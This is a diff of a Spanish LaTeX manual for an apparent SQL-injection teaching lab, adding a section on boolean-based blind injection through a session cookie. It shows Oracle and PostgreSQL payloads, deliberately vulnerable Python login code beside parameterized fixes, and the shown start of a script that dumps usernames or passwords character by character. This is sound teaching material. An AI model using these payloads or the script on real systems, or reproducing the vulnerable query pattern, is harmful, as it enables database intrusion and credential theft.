@@ -17,6 +17,8 @@
 \usepackage{float}  % Ayuda con los entornos flotantes
 \usepackage[absolute,overlay]{textpos}
 \usepackage[hidelinks]{hyperref}
+\usepackage{url}
+\usepackage{hyperref}
 
 \geometry{top=2cm,bottom=2cm,left=2cm,right=2cm}  % Márgenes personalizados
 \definecolor{mybeige}{RGB}{245, 245, 200}
@@ -61,6 +63,8 @@
     numberstyle=\tiny,
     numbersep=5pt,
     tabsize=4,
+    aboveskip=1em,                     % Espacio antes del bloque
+    belowskip=2em,                     % Espacio después del bloque
     breaklines=true,
     breakatwhitespace=false,
     escapeinside={(*@}{@*)},
@@ -92,6 +96,8 @@
     numberstyle=\tiny,
     numbersep=5pt,
     tabsize=4,
+    aboveskip=1em,                     % Espacio antes del bloque
+    belowskip=2em,                     % Espacio después del bloque
     breaklines=true,
     breakatwhitespace=false,
     escapeinside={(*@}{@*)},
@@ -131,7 +137,7 @@
     xleftmargin=0.5cm,                 % Margen izquierdo
     xrightmargin=0.5cm,                % Margen derecho
     aboveskip=1em,                     % Espacio antes del bloque
-    belowskip=1em,                     % Espacio después del bloque
+    belowskip=2em,                     % Espacio después del bloque
     escapeinside={(*@}{@*)},
     inputencoding=utf8,      % Configura el encoding
     literate={ñ}{{\~n}}1
@@ -1567,7 +1573,7 @@ En el caso de la base de datos Oracle, se va a utilizar la siguiente inyección 
 En el usuario:
 
 \begin{lstlisting}[language=SQL]
-    ' OR (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+' OR (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1/0 ELSE 1 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
 \end{lstlisting}
 
 En la contraseña se introduce cualquier valor válido.
@@ -1645,7 +1651,7 @@ En el caso de nuestro laboratorio, el cual está diseñado para usarse con una i
 En cambio, se podría realizar intentando buscar otra lógica en la consulta que permita inferir la información deseada.
 %-----------------------------------------------------------------------------------------------
 \section{Inyecciones Blind en SQL}
-Las inyecciones SQL \textbf{Blind} son un tipo de ataque en el que un atacante puede inferir información sobre la base de datos a pesar de que la aplicación no proporciona mensajes de error explícitos o respuestas directas. A diferencia de las inyecciones SQL tradicionales, en las que los resultados de las consultas maliciosas pueden ser visibles en la interfaz de la aplicación, las inyecciones \textbf{Blind} se basan en observar diferencias en el comportamiento de la aplicación para deducir información sensible.
+Las \textbf{Blind} SQL Injections son un tipo de inyección en el que un atacante puede inferir información sobre la base de datos a pesar de que la aplicación no proporciona mensajes de error explícitos o respuestas directas. A diferencia de las inyecciones SQL tradicionales, en las que los resultados de las consultas maliciosas pueden ser visibles en la interfaz de la aplicación, las inyecciones \textbf{Blind} se basan en observar diferencias en el comportamiento de la aplicación para deducir información sensible.
 
 Este tipo de ataque es especialmente efectivo en aplicaciones que han implementado medidas básicas de seguridad, como la supresión de mensajes de error, pero que siguen siendo vulnerables debido a la falta de validación adecuada de las entradas del usuario.
 
@@ -1673,8 +1679,6 @@ Existen varios métodos para llevar a cabo ataques Blind, dependiendo de cómo s
     \item \textbf{Basadas en tiempo:}
     Este enfoque utiliza funciones de retardo en SQL, como \texttt{SLEEP()} en PostgreSQL o \texttt{DBMS\_LOCK.SLEEP()} en Oracle, para medir el tiempo de respuesta de la aplicación. Si la aplicación tarda más en responder, el atacante puede inferir que la consulta fue evaluada como verdadera.
 
-    \item \textbf{Basadas en diferencias de contenido:}
-    En este método, el atacante compara los cambios en el contenido devuelto por la aplicación para determinar si una condición se cumple. Por ejemplo, un mensaje de éxito o error podría indicar el resultado de la consulta.
 \end{itemize}
 
 \subsection{Objetivos de las inyecciones Blind}
@@ -1711,17 +1715,609 @@ Aunque las inyecciones Blind no proporcionan información directa, son una herra
 Medidas como la validación estricta de entradas, el uso de consultas parametrizadas y la reducción de diferencias en las respuestas de la aplicación son fundamentales para mitigar el riesgo de inyecciones SQL Blind.
 
 \section{Inyección Blind basada en condiciones booleanas}
+Para acceder a la sección específica para esta inyección en el laboratorio, una vez desplegado el servidor, se debe seleccionar la opción Boolean-Based Blind SQL Injection, en Oracle o en PostgreSQL.
 
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind1.png}
+    \caption{Opción de Boolean-Based Blind SQL Injection en el laboratorio de inyecciones SQL}
+\end{figure}
 
+Como se ha comentado anteriormente, las inyecciones \textbf{Blind} no reportan ningún tipo de mensaje de error interno, por lo que el atacante debe buscar otros medios para obtener información sensible. Una de las opciones más comunes es "\textit{jugar}" con la cookie de sesión. La mayoría de las aplicaciones web utilizan cookies para almacenar información de sesión, como el ID de usuario o el token de autenticación. Al modificar manualmente la cookie de sesión, el atacante puede intentar obtener información sensible. \\
 
+En este caso, se simulará la intercepción de la petición de inicio de sesión mediante la herramienta \textbf{Burp Suite}. Una vez interceptada la petición, se modificará manualmente la cookie de sesión para realizar una inyección \textbf{Blind Boolean} en ese campo.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind2.png}
+    \caption{Botón para "interceptar" la petición de inicio de sesión}
+\end{figure}
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind3.png}
+    \caption{Petición de inicio de sesión interceptada en Burp Suite}
+\end{figure}
+
+Una vez interceptada la petición se puede observar como efectivamente existe un campo de \textit{cookie} de sesión. En este caso, el valor que tiene corresponde a la \textit{cookie} de sesión de un \textit{user1}. Si se hace click en el botón \textit{Forward}, se enviará la petición al servidor, y se podrá observar la respuesta de la aplicación.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind4.png}
+    \caption{Respuesta del servidor al envío de la petición}
+\end{figure}
+
+Se puede observar en la figura anterior que, como la \textit{cookie} de sesión es válida y corresponde a un usuario registrado, habrá un cambio en la aplicación, en este caso un mensaje de bienvenida. Si por el contrario la \textit{cookie} de sesión no es válida, la aplicación no mostraría nada, no sufriría cambios.\\
+
+Esto puede ser utilizado por un atacante para evaluar si ciertas condiciones se cumplen en la base de datos. En caso de que se cumplan, la aplicación mostrará un mensaje de bienvenida, en caso contrario, no mostrará nada.
+
+\subsection{Entendiendo la inyección}
+
+Para ilustrar el funcionamiento de una inyección Blind basada en condiciones booleanas, se presenta un caso básico en el que el atacante busca evaluar si una condición es \texttt{TRUE} o \texttt{FALSE}. Dependiendo del resultado de la condición, la aplicación cambia su comportamiento.
+
+\subsubsection{Payload válido (condición TRUE)}
+
+El siguiente payload se utiliza para evaluar una condición que siempre es verdadera:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='1
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{d382yd8n21df4314fn817yf6834188ls023d8d} es el valor inicial de la cookie de sesión.
+    \item La condición \texttt{AND '1'='1'} siempre se evalúa como verdadera.
+\end{itemize}
+
+\textbf{Comportamiento de la aplicación:} Dado que la condición es verdadera, la aplicación reconoce la cookie de sesión como válida y genera un cambio visible, como un mensaje de bienvenida.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind4.png} 
+    \caption{Cambio en la aplicación al evaluar una condición TRUE}
+\end{figure}
+
+\subsubsection{Payload inválido (condición FALSE)}
+
+El siguiente payload se utiliza para evaluar una condición que siempre es falsa:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND '1'='2
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{d382yd8n21df4314fn817yf6834188ls023d8d} sigue siendo el valor inicial de la cookie de sesión.
+    \item La condición \texttt{AND '1'='2'} siempre se evalúa como falsa.
+    \item Como resultado, la consulta original de la aplicación no devuelve ningún resultado válido.
+\end{itemize}
+
+\textbf{Comportamiento de la aplicación:} Dado que la condición es falsa, la aplicación no reconoce la cookie de sesión como válida y no genera ningún cambio visible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind5.png}
+    \caption{Sin cambios en la aplicación al evaluar una condición FALSE}
+\end{figure}
+
+\subsubsection{Explicación del funcionamiento}
+
+La diferencia en el comportamiento de la aplicación entre las dos condiciones permite al atacante inferir si la consulta SQL subyacente ha devuelto resultados válidos o no. Este patrón de comportamiento constituye la base de las inyecciones \textbf{Blind}.
+
+\subsection{Obtención de la longitud de un campo de la base de datos}
+
+El objetivo de esta inyección \textbf{Blind Boolean} es determinar la longitud del nombre de usuario almacenado en el primer registro de la tabla \texttt{Usuarios}. Esto se logra mediante una consulta que evalúa si la longitud (\texttt{LENGTH}) del campo \texttt{username} coincide con un valor específico. Dependiendo del resultado de la evaluación, la aplicación se comportará de manera diferente, permitiendo al atacante deducir el resultado.
+
+\subsubsection{Payload para una condición TRUE}
+
+El siguiente payload verifica si la longitud del nombre de usuario en el primer registro de la tabla \texttt{Usuarios} es igual a \texttt{5}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{LENGTH(username)}: Calcula la longitud del nombre de usuario.
+    \item \texttt{CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 1/0 END}: 
+    - Si la longitud del nombre de usuario es igual a \texttt{5}, se devuelve \texttt{1}.
+    - Si no, se intenta dividir por \texttt{0}, lo que provoca un error y hace que la consulta falle.
+    \item \texttt{(SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1}: Selecciona únicamente el primer registro de la tabla \texttt{Usuarios}.
+    \item \texttt{= 1}: Evalúa si el resultado del \texttt{CASE} es igual a \texttt{1}.
+\end{itemize}
+
+Dado que el primer usuario en la base de datos tiene un nombre de usuario con exactamente \texttt{5} caracteres, esta inyección se evalúa como \texttt{TRUE}, y la aplicación muestra un cambio visible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind4.png}
+    \caption{Cambio en la aplicación al evaluar que la longitud del campo es 5 (TRUE)}
+\end{figure}
+
+\subsubsection{Payload para una condición FALSE}
+
+El siguiente payload verifica si la longitud del nombre de usuario en el primer registro de la tabla \texttt{Usuarios} es igual a \texttt{33}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item Todos los componentes del payload son idénticos al anterior, excepto la condición \texttt{LENGTH(username) = 33}.
+    \item Como el primer usuario de la base de datos no tiene un nombre de usuario con una longitud de \texttt{33} caracteres, el \texttt{CASE} evalúa la opción \texttt{ELSE}, lo que provoca un error al intentar dividir por \texttt{0}. AL tratase de una inyección \textbf{Blind}, la aplicación no muestra mensajes de error visibles, simplemente no hay cambios en la respuesta.
+\end{itemize}
+
+Dado que la condición es falsa, la consulta falla y la aplicación no muestra ningún cambio visible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind5.png}
+    \caption{Sin cambios en la aplicación al evaluar que la longitud del campo no es 33 (FALSE)}
+\end{figure}
+
+\subsubsection{Explicación del funcionamiento}
+
+La lógica de las inyecciones se basa en:
+\begin{itemize}
+    \item Utilizar la función \texttt{LENGTH} para calcular la longitud del nombre de usuario.
+    \item Introducir una estructura \texttt{CASE} que genere un error si la condición no se cumple. Este error provoca un fallo en la consulta y, por ende, en la respuesta de la aplicación (sin mensajes de error visibles).
+    \item Evaluar el comportamiento de la aplicación (mensaje de bienvenida o falta de respuesta) para deducir si la condición es verdadera o falsa.
+\end{itemize}
+
+\textbf{Por qué una consulta devuelve TRUE y la otra FALSE:}
+\begin{itemize}
+    \item En el primer caso, el primer usuario de la base de datos tiene un nombre de usuario con una longitud de \texttt{5} caracteres. Por lo tanto, la condición \texttt{LENGTH(username) = 5} se evalúa como \texttt{TRUE}, y el \texttt{CASE} devuelve \texttt{1}.
+    \item En el segundo caso, la longitud del nombre de usuario no es \texttt{33}, lo que activa la opción \texttt{ELSE} del \texttt{CASE}, provocando un error de división por cero. Esto hace que la consulta falle.
+\end{itemize}
+
+\subsection{Obtención de un carácter específico de un campo de la base de datos}
+
+El objetivo de esta inyección \textbf{Blind Boolean} es determinar el valor de un carácter específico del nombre de usuario almacenado en el primer registro de la tabla \texttt{Usuarios}. Esto se logra mediante una consulta que compara el carácter seleccionado con un valor específico. Dependiendo del resultado de la comparación, la aplicación se comportará de manera diferente, lo que permite al atacante deducir el valor del carácter.
+
+\subsubsection{Payload para una condición TRUE}
+
+El siguiente payload verifica si el primer carácter del nombre de usuario en el primer registro de la tabla \texttt{Usuarios} es igual a \texttt{'a'}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{SUBSTR(username, 1, 1)}: Extrae el primer carácter (\texttt{1, 1}) del nombre de usuario.
+    \item \texttt{CASE WHEN (SUBSTR(username, 1, 1) = 'a') THEN 1 ELSE 1/0 END}:
+    - Si el primer carácter es igual a \texttt{'a'}, se devuelve \texttt{1}.
+    - Si no, se intenta dividir por \texttt{0}, lo que provoca un error y hace que la consulta falle. AL tratase de una inyección \textbf{Blind}, la aplicación no muestra mensajes de error visibles, simplemente no hay cambios en la respuesta.
+    \item \texttt{(SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1}: Selecciona únicamente el primer registro de la tabla \texttt{Usuarios}.
+    \item \texttt{= 1}: Evalúa si el resultado del \texttt{CASE} es igual a \texttt{1}.
+\end{itemize}
+
+Dado que el primer usuario en la base de datos es \texttt{'admin'}, cuyo primer carácter es \texttt{'a'}, esta inyección se evalúa como \texttt{TRUE}, y la aplicación muestra un cambio visible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind4.png}
+    \caption{Cambio en la aplicación al evaluar que el carácter es 'a' (TRUE)}
+\end{figure}
+
+\subsubsection{Payload para una condición FALSE}
+
+El siguiente payload verifica si el primer carácter del nombre de usuario en el primer registro de la tabla \texttt{Usuarios} es igual a \texttt{'z'}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTR(username, 1, 1) = 'z') THEN 1 ELSE 1/0 END FROM (SELECT username, ROWNUM AS rn FROM Usuarios) WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item Todos los componentes del payload son idénticos al anterior, excepto la condición \texttt{SUBSTR(username, 1, 1) = 'z'}.
+    \item Como el primer usuario de la base de datos tiene el nombre de usuario \texttt{'admin'}, cuyo primer carácter no es \texttt{'z'}, el \texttt{CASE} evalúa la opción \texttt{ELSE}, lo que provoca un error al intentar dividir por \texttt{0}.
+\end{itemize}
+
+Dado que la condición es falsa, la consulta falla y la aplicación no muestra ningún cambio visible.
+
+\begin{figure}[H]
+    \centering
+    \includegraphics[width=0.8\textwidth]{Imagenes/blind5.png}
+    \caption{Sin cambios en la aplicación al evaluar que el carácter no es 'z' (FALSE)}
+\end{figure}
+
+\subsubsection{Explicación del funcionamiento}
+
+La lógica de las inyecciones se basa en:
+\begin{itemize}
+    \item Utilizar la función \texttt{SUBSTR} para extraer el carácter deseado del nombre de usuario.
+    \item Introducir una estructura \texttt{CASE} que genere un error si la condición no se cumple. Este error provoca un fallo en la consulta y, por ende, en la respuesta de la aplicación (sin mensajes de error visibles).
+    \item Evaluar el comportamiento de la aplicación (mensaje de bienvenida o falta de respuesta) para deducir si la condición es verdadera o falsa.
+\end{itemize}
+
+\textbf{Por qué una consulta devuelve TRUE y la otra FALSE:}
+\begin{itemize}
+    \item En el primer caso, el primer usuario de la base de datos tiene el nombre de usuario \texttt{'admin'}, cuyo primer carácter es \texttt{'a'}. Por lo tanto, la condición \texttt{SUBSTR(username, 1, 1) = 'a'} se evalúa como \texttt{TRUE}, y el \texttt{CASE} devuelve \texttt{1}.
+    \item En el segundo caso, el primer carácter del nombre de usuario no es \texttt{'z'}, lo que activa la opción \texttt{ELSE} del \texttt{CASE}, provocando un error de división por cero. Esto hace que la consulta falle.
+\end{itemize}
+
+\subsection{Diferencias de las inyecciones en PostgreSQL}
+
+Aunque las inyecciones \textbf{Blind Boolean} comparten un principio básico entre Oracle y PostgreSQL, existen diferencias significativas en la sintaxis y las funciones específicas utilizadas debido a las particularidades de cada sistema de gestión de bases de datos. En PostgreSQL, la adaptación de las consultas para las inyecciones discutidas anteriormente incluye los cambios ilustrados en las siguientes secciones.
+
+\subsubsection{Obtención de la longitud de un campo}
+
+En PostgreSQL, las diferencias principales radican en:
+\begin{itemize}
+    \item La función \texttt{ROW\_NUMBER() OVER()} se utiliza en lugar de \texttt{ROWNUM} para asignar un número de fila a cada registro.
+    \item En lugar de provocar un error con una división por cero (\texttt{1/0}), se devuelve un valor arbitrario como \texttt{999} en la opción \texttt{ELSE} del \texttt{CASE}. Esto se debe a que PostgreSQL evalua la consulta completa antes de ejecutarla, y si encuentra un error, no se ejecuta y lanza error.
+\end{itemize}
+
+\paragraph{Inyección que devuelve TRUE}
+La siguiente inyección verifica si la longitud del nombre de usuario en el primer registro es igual a \texttt{5}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 5) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{LENGTH(username)} calcula la longitud del nombre de usuario.
+    \item \texttt{ROW\_NUMBER() OVER()} asigna un número de fila a cada registro, comenzando por \texttt{1}.
+    \item La condición \texttt{LENGTH(username) = 5} se evalúa como \texttt{TRUE}, devolviendo \texttt{1}, lo que provoca un cambio visible en la aplicación.
+\end{itemize}
+
+\paragraph{Inyección que devuelve FALSE}
+La siguiente inyección verifica si la longitud del nombre de usuario en el primer registro es igual a \texttt{33}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (LENGTH(username) = 33) THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --
+\end{lstlisting}
+
+Dado que el nombre de usuario en el primer registro no tiene \texttt{33} caracteres, la condición se evalúa como \texttt{FALSE}, devolviendo \texttt{999}. Esto hace que la consulta no genere cambios visibles en la aplicación.
+
+\subsubsection{Obtención de un carácter específico de un campo}
+
+En PostgreSQL, las principales diferencias para esta inyección son:
+\begin{itemize}
+    \item La función \texttt{SUBSTRING} se utiliza en lugar de \texttt{SUBSTR} para extraer un carácter específico de una cadena.
+    \item La función \texttt{SUBSTRING} requiere las palabras clave \texttt{FROM} y \texttt{FOR} para indicar la posición inicial y la longitud del segmento a extraer.
+\end{itemize}
+
+\paragraph{Inyección que devuelve TRUE}
+La siguiente inyección verifica si el primer carácter del nombre de usuario en el primer registro es \texttt{'a'}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'a') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --
+\end{lstlisting}
+
+En este caso:
+\begin{itemize}
+    \item \texttt{SUBSTRING(username FROM 1 FOR 1)} extrae el primer carácter del nombre de usuario.
+    \item La condición \texttt{SUBSTRING(username FROM 1 FOR 1) = 'a'} se evalúa como \texttt{TRUE}, devolviendo \texttt{1}, lo que provoca un cambio visible en la aplicación.
+\end{itemize}
+
+\paragraph{Inyección que devuelve FALSE}
+La siguiente inyección verifica si el primer carácter del nombre de usuario en el primer registro es \texttt{'z'}:
+
+\begin{lstlisting}[language=SQL]
+d382yd8n21df4314fn817yf6834188ls023d8d' AND (SELECT CASE WHEN (SUBSTRING(username FROM 1 FOR 1) = 'z') THEN 1 ELSE 999 END FROM (SELECT username, ROW_NUMBER() OVER() AS rn FROM Usuarios) AS subquery WHERE rn=1) = 1 --
+\end{lstlisting}
+
+Dado que el primer carácter del nombre de usuario en el primer registro no es \texttt{'z'}, la condición se evalúa como \texttt{FALSE}, devolviendo \texttt{999}. Esto hace que la consulta no genere cambios visibles en la aplicación.
+
+\subsubsection{Resumen de las diferencias entre Oracle y PostgreSQL}
+
+\begin{itemize}
+    \item En PostgreSQL, \texttt{ROW\_NUMBER() OVER()} se utiliza para asignar números de fila, mientras que en Oracle se utiliza \texttt{ROWNUM}.
+    \item La función \texttt{SUBSTRING} reemplaza a \texttt{SUBSTR} en PostgreSQL.
+    \item PostgreSQL evalúa la consulta completa antes de ejecutarla, lo que impide el uso de errores de división por cero para provocar fallos.
+    \item La sintaxis de \texttt{SUBSTRING} requiere el uso de \texttt{FROM} y \texttt{FOR}, mientras que \texttt{SUBSTR} en Oracle utiliza parámetros posicionales.
+\end{itemize}
+
+A pesar de estas diferencias entre \textbf{SGBD}, el principio subyacente de las inyecciones \textbf{Blind Boolean} sigue siendo el mismo.
+
+\subsection{Código vulnerable del login}
+
+En esta sección se documenta el código que utiliza el valor de la cookie de sesión para comprobar si esta es válida. El problema radica en que el valor de la cookie proporcionado por el usuario es concatenado directamente en la consulta SQL, lo que permite la ejecución de inyecciones SQL, incluidas las inyecciones \textbf{Blind Boolean}.
+
+\subsubsection{Código vulnerable en Oracle}
+
+A continuación, se presenta el código en Python para el login en Oracle:
+
+\begin{lstlisting}[language=Python]
+def login_inseguro_blind_oracle(cookie_value):
+    print("---login_inseguro_blind_oracle---")
+    conexion = dbConectarOracle()
+    if not conexion:
+        print("Error: no se pudo conectar para autenticar.")
+        return False
+
+    # Simular inyección SQL blind via cookie
+    sentencia = "SELECT * FROM Usuarios WHERE session_cookie = '" + cookie_value + "'"
+    try:
+        cursor = conexion.cursor()
+        cursor.execute(sentencia)
+        usuario = cursor.fetchone()
+        cursor.close()
+        if usuario:
+            print("Usuario autenticado:", usuario)
+            return {"resultado": usuario, "sentencia": sentencia, "auth": "true"}
+        else:
+            print("Usuario o cookie incorrectos")
+            return {"sentencia": sentencia}
+    except PBD.DatabaseError as error:
+        print("Error al autenticar usuario con cookie")
+        print(error)
+        return {"resultado": error, "sentencia": sentencia}
+\end{lstlisting}
+
+\textbf{Localización de la vulnerabilidad:} La vulnerabilidad se encuentra en la construcción de la variable \texttt{sentencia}, donde el valor de la cookie proporcionado por el usuario (\texttt{cookie\_value}) se concatena directamente en la consulta SQL sin ningún tipo de validación ni sanitización:
+
+\begin{lstlisting}[language=Python]
+sentencia = "SELECT * FROM Usuarios WHERE session_cookie = '" + cookie_value + "'"
+\end{lstlisting}
+
+Esta práctica permite que un atacante manipule el valor de la cookie para incluir un payload malicioso, como las inyecciones \textbf{Blind Boolean} documentadas anteriormente.
+
+\subsubsection{Versión segura del código en Oracle}
+
+Para prevenir esta vulnerabilidad, se debe emplear el uso de consultas parametrizadas. A continuación, se presenta una versión segura del código:
+
+\begin{lstlisting}[language=Python]
+def login_seguro_blind_oracle(cookie_value):
+    print("---login_seguro_blind_oracle---")
+    conexion = dbConectarOracle()
+    if not conexion:
+        print("Error: no se pudo conectar para autenticar.")
+        return False
+
+    # Evitar concatenación directa usando consultas parametrizadas
+    sentencia = "SELECT * FROM Usuarios WHERE session_cookie = (*@\colorbox{yellow}{:cookie\_value}@*)"
+    try:
+        cursor = conexion.cursor()
+        cursor.execute(sentencia, {"cookie_value": cookie_value})
+        usuario = cursor.fetchone()
+        cursor.close()
+        if usuario:
+            print("Usuario autenticado:", usuario)
+            return {"resultado": usuario, "auth": "true"}
+        else:
+            print("Usuario o cookie incorrectos")
+            return {"auth": "false"}
+    except PBD.DatabaseError as error:
+        print("Error al autenticar usuario con cookie")
+        print(error)
+        return {"resultado": error}
+\end{lstlisting}
+
+La consulta parametrizada (\texttt{:cookie\_value}) asegura que el valor de la cookie sea tratado como un literal, eliminando la posibilidad de ejecutar código SQL malicioso.
+
+\subsubsection{Código vulnerable en PostgreSQL}
+
+A continuación, se presenta el código en Python para el login en PostgreSQL:
+
+\begin{lstlisting}[language=Python]
+def login_inseguro_blind_postgresql(cookie_value):
+    print("---login_inseguro_blind_postgresql---")
+    conexion = dbConectarPostgreSQL()
+    if not conexion:
+        print("Error: no se pudo conectar para autenticar.")
+        return False
+
+    # Simular inyección SQL blind via cookie
+    sentencia = "SELECT * FROM Usuarios WHERE session_cookie = '" + cookie_value + "'"
+    try:
+        cursor = conexion.cursor()
+        cursor.execute(sentencia)
+        usuario = cursor.fetchone()
+        cursor.close()
+        if usuario:
+            print("Usuario autenticado:", usuario)
+            return {"resultado": usuario, "sentencia": sentencia, "auth": "true"}
+        else:
+            print("Usuario o cookie incorrectos")
+            return {"sentencia": sentencia}
+    except PBD.DatabaseError as error:
+        print("Error al autenticar usuario con cookie")
+        print(error)
+        return {"resultado": error, "sentencia": sentencia}
+\end{lstlisting}
+
+\textbf{Localización de la vulnerabilidad:} La vulnerabilidad en PostgreSQL también radica en la concatenación directa del valor de la cookie en la consulta SQL:
+
+\begin{lstlisting}[language=Python]
+sentencia = "SELECT * FROM Usuarios WHERE session_cookie = '" + cookie_value + "'"
+\end{lstlisting}
+
+Esto permite a un atacante manipular el valor de la cookie para realizar inyecciones SQL, incluida la ejecución de consultas \textbf{Blind Boolean}.
+
+\subsubsection{Versión segura del código en PostgreSQL}
+
+La versión segura del código utiliza consultas parametrizadas, que protegen contra inyecciones SQL:
+
+\begin{lstlisting}[language=Python]
+def login_seguro_blind_postgresql(cookie_value):
+    print("---login_seguro_blind_postgresql---")
+    conexion = dbConectarPostgreSQL()
+    if not conexion:
+        print("Error: no se pudo conectar para autenticar.")
+        return False
+
+    # Evitar concatenación directa usando consultas parametrizadas
+    sentencia = "SELECT * FROM Usuarios WHERE (*@\colorbox{yellow}{session\_cookie = \%s}@*)"
+    try:
+        cursor = conexion.cursor()
+        cursor.execute(sentencia, (cookie_value,))
+        usuario = cursor.fetchone()
+        cursor.close()
+        if usuario:
+            print("Usuario autenticado:", usuario)
+            return {"resultado": usuario, "auth": "true"}
+        else:
+            print("Usuario o cookie incorrectos")
+            return {"auth": "false"}
+    except PBD.DatabaseError as error:
+        print("Error al autenticar usuario con cookie")
+        print(error)
+        return {"resultado": error}
+\end{lstlisting}
+
+El uso de \texttt{\%s} en la consulta parametrizada asegura que el valor de la cookie sea tratado como un literal y evita la ejecución de código SQL malicioso.
+
+\subsection{Automatización de inyecciones Blind Boolean}
+
+Realizar un ataque manual basado en inyecciones \textbf{Blind Boolean} para extraer datos sensibles de la base de datos resulta extremadamente ineficiente, debido al elevado número de consultas necesarias. Para optimizar este proceso, se ha desarrollado un script automatizado en Python que permite dumpear todos los valores de un campo especificado (\texttt{username} o \texttt{password}) de la base de datos. El script emplea peticiones HTTP con inyecciones \textbf{Blind Boolean} y analiza las respuestas para extraer información carácter por carácter y fila por fila.
+
+A continuación, se explican las partes más importantes del script:
+
+\subsubsection{Construcción de la inyección SQL}
+
+El script genera dinámicamente un payload que realiza la inyección SQL específica para comprobar si un carácter en una posición concreta de un campo coincide con un valor dado. Esta función es esencial para realizar el ataque carácter por carácter.
+
+\begin{lstlisting}[language=Python]
+def construir_inyeccion(campo, posicion, caracter, indice):
+    """
+    Construye el payload de inyección SQL para extraer un carácter específico de una fila específica.
+    """
+    caracter_escapado = caracter.replace("'", "''")
+    payload = (
+        f"d382yd8n21df4314fn817yf6834188ls023d8d' "
+        f"AND (SELECT CASE WHEN (SUBSTR({campo}, {posicion}, 1) = '{caracter_escapado}') "
+        f"THEN 1 ELSE 1/0 END FROM (SELECT {campo}, ROWNUM AS rn FROM Usuarios) WHERE rn={indice}) = 1 --"
+    )
+    return payload
+\end{lstlisting}
+
+\textbf{Descripción de la función:}
+\begin{itemize}
+    \item \texttt{campo}: El nombre del campo de la base de datos (como \texttt{username} o \texttt{password}).
+    \item \texttt{posicion}: La posición del carácter que se quiere comprobar.
+    \item \texttt{caracter}: El carácter que se intenta validar.
+    \item \texttt{indice}: El índice de la fila en la tabla que se está atacando.
+\end{itemize}
+
+El uso de \texttt{CASE WHEN} permite determinar si la condición es verdadera o falsa. Si es verdadera, se devuelve \texttt{1}; si es falsa, se genera un error controlado con \texttt{1/0}.
+
+\subsubsection{Envío de la inyección y análisis de la respuesta}
+
+El script envía cada payload generado al servidor mediante una petición POST. Analiza la respuesta para determinar si la inyección fue exitosa basándose en cambios observables en la interfaz.
+
+\begin{lstlisting}[language=Python]
+def enviar_inyeccion(payload):
+    """
+    Envía la inyección al servidor y devuelve True si se detecta un cambio en la web, False en caso contrario.
+    """
+    data = {
+        "tipo_sqli": "blind_boolean",
+        "database": "Oracle",
+        "cookie_value": payload
+    }
+    response = requests.post(SERVER_URL, json=data, timeout=5)
+    success_keywords = ["Bienvenido de nuevo"]
+    for keyword in success_keywords:
